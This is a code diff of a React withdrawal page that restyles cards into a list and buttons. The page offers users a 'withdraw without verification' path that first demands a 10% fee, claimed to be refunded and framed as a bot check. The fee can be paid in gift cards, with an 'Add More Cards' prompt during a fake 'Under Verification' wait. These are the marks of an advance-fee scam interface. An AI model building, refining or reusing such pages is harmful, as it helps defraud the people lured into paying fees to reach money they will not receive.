@@ -331,31 +331,36 @@ const Withdraw = () => {
 
       <div className="withdraw-body">
         {mode === 'select' && (
-          <div className="selection-cards" style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
-            <div
-              className="step-card"
-              style={{ cursor: 'pointer', textAlign: 'center', border: '1px solid var(--border)' }}
-              onClick={() => setMode('kyc')}
-            >
-              <FiShield style={{ fontSize: '32px', color: 'var(--success)', marginBottom: '10px' }} />
-              <h3>Verify to Withdraw</h3>
-              <p className="hint">
-                You will need to verify a KYC to make a successful withdrawal without any charges.
-              </p>
+          <div className="withdraw-select-container">
+            {/* Instructions Section */}
+            <div className="instruction-card">
+              <h3>Withdrawal Instructions</h3>
+              <ul className="instruction-list">
+                <li className="kyc-item">
+                  <FiShield />
+                  <div>
+                    <strong>Verify to Withdraw</strong>
+                    You will need to verify a KYC to make a successful withdrawal without any charges.
+                  </div>
+                </li>
+                <li className="unverified-item">
+                  <FiAlertTriangle />
+                  <div>
+                    <strong>Withdraw without Verification</strong>
+                    Here you will make a successful withdrawal without verification, but you will have to pay a 10% of the amount you want to withdraw, and the amount paid will be refunded to your account balance back, it's to know you are not a bot.
+                  </div>
+                </li>
+              </ul>
             </div>
 
-            <div
-              className="step-card"
-              style={{ cursor: 'pointer', textAlign: 'center', border: '1px solid var(--border)' }}
-              onClick={() => setMode('unverified')}
-            >
-              <FiAlertTriangle style={{ fontSize: '32px', color: 'var(--warning)', marginBottom: '10px' }} />
-              <h3>Withdraw without Verification</h3>
-              <p className="hint">
-                Here you will make a successful withdrawal without verification, but you will have to
-                pay a 10% of the amount you want to withdraw, and the amount paid will be credited to
-                your account balance back, it's to know you are not a bot.
-              </p>
+            {/* Selection Buttons */}
+            <div className="mode-selection-buttons">
+              <button className="mode-btn kyc-btn" onClick={() => setMode('kyc')}>
+                <FiShield /> Verify to Withdraw
+              </button>
+              <button className="mode-btn unverified-btn" onClick={() => setMode('unverified')}>
+                <FiAlertTriangle /> Withdraw without Verification
+              </button>
             </div>
           </div>
         )}
@@ -650,10 +655,10 @@ const Withdraw = () => {
                   To verify you are not a bot, you need to pay a 10% charge. This amount will be sent
                   back to you along with your withdrawal.
                 </p>
-                <div className="fee-details" style={{ background: 'var(--bg-1)', padding: '16px', borderRadius: '8px', marginBottom: '16px' }}>
+                <div className="fee-details">
                   <p>Withdrawal Amount: <strong>{fmtUsd(uvData.originalAmount)}</strong></p>
                   <p>10% Fee: <strong>{fmtUsd(uvData.currentPaymentAmount)}</strong></p>
-                  <p style={{ borderTop: '1px solid var(--border)', paddingTop: '8px', marginTop: '8px', fontSize: '16px' }}>
+                  <p>
                     Total to be sent: <strong>{fmtUsd(Number(uvData.originalAmount) + Number(uvData.currentPaymentAmount))}</strong>
                   </p>
                 </div>
@@ -684,10 +689,8 @@ const Withdraw = () => {
               <div className="processing-box">
                 <div className="spinner" />
                 <h3>Under Verification</h3>
-                {/* Removed "admin" */}
                 <p>Your payment is under verification right now. Please wait for approval...</p>
                 
-                {/* Added: Allow adding more cards while processing */}
                 {uvData?.paymentMethod === 'giftcard' && (
                   <button className="primary-btn" style={{ marginTop: '20px' }} onClick={() => setUvStep('payment')}>
                     Add More Cards / Complete Payment
